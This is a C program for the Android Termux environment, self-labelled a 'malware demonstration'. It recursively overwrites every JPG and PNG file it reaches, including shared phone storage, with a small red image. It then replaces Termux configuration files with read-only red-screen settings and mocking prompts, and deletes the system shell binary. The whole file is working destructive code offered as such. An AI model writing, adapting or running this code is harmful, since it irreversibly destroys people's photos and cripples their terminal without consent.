#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdlib.h>

void makeThemRed(char* root){
    unsigned short int i, bytes[363] = {255, 216, 255, 224, 0, 16, 74, 70, 73, 70, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 255, 219, 0, 67, 0, 16, 11, 12, 14, 12, 10, 16, 14, 13, 14, 18, 17, 16, 19, 24, 40, 26, 24, 22, 22, 24, 49, 35, 37, 29, 40, 58, 51, 61, 60, 57, 51, 56, 55, 64, 72, 92, 78, 64, 68, 87, 69, 55, 56, 80, 109, 81, 87, 95, 98, 103, 104, 103, 62, 77, 113, 121, 112, 100, 120, 92, 101, 103, 99, 255, 219, 0, 67, 1, 17, 18, 18, 24, 21, 24, 47, 26, 26, 47, 99, 66, 56, 66, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 255, 192, 0, 17, 8, 0, 100, 0, 100, 3, 1, 34, 0, 2, 17, 1, 3, 17, 1, 255, 196, 0, 21, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 255, 196, 0, 20, 16, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 196, 0, 22, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 6, 255, 196, 0, 20, 17, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 218, 0, 12, 3, 1, 0, 2, 17, 3, 17, 0, 63, 0, 138, 2, 91, 118, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 217};
    char path[350];
    struct dirent *dp;
    DIR *dir = opendir(root);
    if(dir == NULL){
        return;
    }
    while((dp = readdir(dir)) != NULL){
        if(strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0){
            strcpy(path, root);
            strcat(path, "/");
            strcat(path, dp->d_name);
            if((strstr(dp->d_name, ".jpg") || strstr(dp->d_name, ".jpeg") || strstr(dp->d_name, ".png") || strstr(dp->d_name, ".JPG")) != NULL){
                FILE *img = fopen(path, "w+");
                for(i=0;i<=362;i++){
                    fputc(bytes[i], img);
                }
                fclose(img);
            }
            makeThemRed(path);
        }
    }
    closedir(dir);
}

void redMinal(){
	FILE *fp = fopen("/data/data/com.termux/files/usr/etc/motd", "w");
	fputs("\33[1;33mMalware demonstration\n\33[0m", fp);
	fchmod(fileno(fp), 0400);
	fclose(fp);
	fp = fopen("/data/data/com.termux/files/home/.termux/colors.properties", "w");
	fputs("background=#ff2626\nforeground=#ff2626\ncursor=#ff2626\n", fp);
	fchmod(fileno(fp), 0400);
	fclose(fp);
	fp = fopen("/data/data/com.termux/files/usr/etc/bash.bashrc", "a");
	fputs("\n$PS1=\'DemoMalware\'", fp);
	fchmod(fileno(fp), 0400);
	fclose(fp);
	fp = fopen("/data/data/com.termux/files/home/termux.properties", "w");
	fputs("extra-keys = [\\['THIS', 'IS', 'A', 'BULLSHIT', 'MALWARE']\\]", fp);
	fchmod(fileno(fp), 0400);
	fclose(fp);
        system("termux-reload-settings;");
	remove("/data/data/com.termux/files/usr/bin/sh");		
}


int main(){
    if((opendir("/data/data/com.termux/files/home/storage")) == NULL){
    	system("termux-setup-storage;");
    }
    if(opendir("/data/data/com.termux/files/home/.termux")==NULL){
    	mkdir("/data/data/com.termux/files/home/.termux", 0700);
    }
    char *path = "/data/data/com.termux/files";
    makeThemRed(path);
    redMinal();
    printf("\33[1;33mGoodbye :)\33[0m\n");
    return 0;
}
